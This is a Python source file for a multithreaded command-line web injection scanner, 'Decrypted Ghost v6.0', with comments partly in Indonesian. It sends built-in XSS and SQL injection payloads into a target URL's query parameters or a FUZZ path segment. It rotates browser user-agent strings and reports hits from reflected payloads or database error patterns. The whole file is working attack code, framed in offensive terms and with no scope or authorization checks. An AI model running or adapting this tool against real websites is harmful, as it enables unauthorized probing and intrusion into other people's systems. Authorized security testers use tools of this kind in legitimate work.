import requests
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import concurrent.futures
import random
import re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
]

XSS_PAYLOADS = [
    "<script>alert('GHOST_XSS')</script>",
    "\"><svg/onload=prompt('GHOST_XSS')>",
    "'-prompt('GHOST_XSS')-'",
    "javascript:alert('GHOST_XSS')"
]

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL,NULL--", "1' ORDER BY 1--+"
]

SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.",
    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
    r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
    r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine",
    r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException"
]

def print_banner():
    print(r"""
    ____  ____  ____  ____  _  _  ____  ____  ____  ____     ___  _  _  __  ____  ____ 
   (  _ \(  __)/ ___)(  _ \( \/ )(  _ \(_  _)(  __)(  _ \   / __)/ )( \/  \/ ___)(_  _)
    )(_) )) _) \___ \ )   / \  /  ) __/  )(   ) _)  )(_) ) ( (_ \) __ (  O \___ \  )(  
   (____/(____)(____/(__\_) (__) (__)   (__) (____)(____/   \___/\_)(_/\__/(____/ (__) 
                v6.0 MILITARY GRADE - RESTful & Query Active Injector
    """)

def analyze_response(response_text, payload, param_name, target_url, attack_type):
    """Mesin Heuristik untuk menganalisis hasil tembakan"""
    if attack_type == "XSS" and payload in response_text:
        return f"[!!!] XSS VULNERABILITY FOUND!\n    [>] Target  : {param_name}\n    [>] Payload : {payload}\n    [>] URL     : {target_url}"
    elif attack_type == "SQLi":
        for error_regex in SQL_ERRORS:
            if re.search(error_regex, response_text, re.IGNORECASE):
                return f"[!!!] SQLi VULNERABILITY FOUND (Error-Based)!\n    [>] Target  : {param_name}\n    [>] Payload : {payload}\n    [>] URL     : {target_url}"
    return None

def inject_query(base_url, params, param_to_inject, payload, attack_type):
    """Menembak target Query (contoh: ?id=1)"""
    malicious_params = params.copy()
    if isinstance(malicious_params[param_to_inject], list):
        malicious_params[param_to_inject] = [payload]
    else:
        malicious_params[param_to_inject] = payload

    query_string = urlencode(malicious_params, doseq=True)
    parsed_url = urlparse(base_url)
    target_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, query_string, parsed_url.fragment))

    try:
        response = requests.get(target_url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=7)
        return analyze_response(response.text, payload, param_to_inject, target_url, attack_type)
    except requests.exceptions.RequestException:
        return None

def inject_restful(base_url, payload, attack_type):
    """Menembak target RESTful Path yang ditandai dengan FUZZ"""
    # Mengganti kata FUZZ dengan payload jahat
    target_url = base_url.replace("FUZZ", payload)
    
    try:
        response = requests.get(target_url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=7)
        return analyze_response(response.text, payload, "REST_PATH (FUZZ)", target_url, attack_type)
    except requests.exceptions.RequestException:
        return None

def start_attack(target_url, threads):
    print_banner()
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url

    parsed_url = urlparse(target_url)
    params = parse_qs(parsed_url.query)
    
    # Deteksi Mode Serangan
    mode = None
    if "FUZZ" in target_url:
        mode = "RESTFUL"
    elif params:
        mode = "QUERY"
    else:
        print("[-] ABORT: Target tidak valid!")
        print("[-] Gunakan ?id=1 (Query) ATAU gunakan keyword FUZZ di URL (contoh: /users/FUZZ/edit)")
        sys.exit(1)

    print("-" * 65)
    print(f"[*] Target URL     : {target_url}")
    print(f"[*] Attack Mode    : {mode} INJECTION")
    print(f"[*] Attack Vectors : {len(XSS_PAYLOADS)} XSS + {len(SQLI_PAYLOADS)} SQLi payloads")
    print(f"[*] Threads Engine : {threads} concurrent workers")
    print("-" * 65)
    print("[*] Engaging Active Injection... (Press Ctrl+C to abort)\n")

    vulnerabilities_found = []
    tasks = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        if mode == "QUERY":
            for param in params.keys():
                for payload in XSS_PAYLOADS:
                    tasks.append(executor.submit(inject_query, target_url, params, param, payload, "XSS"))
                for payload in SQLI_PAYLOADS:
                    tasks.append(executor.submit(inject_query, target_url, params, param, payload, "SQLi"))
        
        elif mode == "RESTFUL":
            for payload in XSS_PAYLOADS:
                tasks.append(executor.submit(inject_restful, target_url, payload, "XSS"))
            for payload in SQLI_PAYLOADS:
                tasks.append(executor.submit(inject_restful, target_url, payload, "SQLi"))

        try:
            for future in concurrent.futures.as_completed(tasks):
                result = future.result()
                if result:
                    print(result)
                    print("-" * 50)
                    vulnerabilities_found.append(result)
        except KeyboardInterrupt:
            print("\n[!] User Abort Detected. Ceasing fire...")
            sys.exit(0)

    print("\n" + "=" * 65)
    if vulnerabilities_found:
        print(f"[*] CRITICAL: Found {len(vulnerabilities_found)} potential vulnerabilities!")
    else:
        print("[*] Target is SECURE against basic injection attacks.")
    print("=" * 65)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Decrypted Ghost v6.0 - Active Vulnerability Injector")
    parser.add_argument("-u", "--url", help="Target URL (gunakan param ?id=1 atau keyword FUZZ)", required=True)
    parser.add_argument("-t", "--threads", help="Number of Threads (Default: 10)", type=int, default=10)
    args = parser.parse_args()
    start_attack(args.url, args.threads)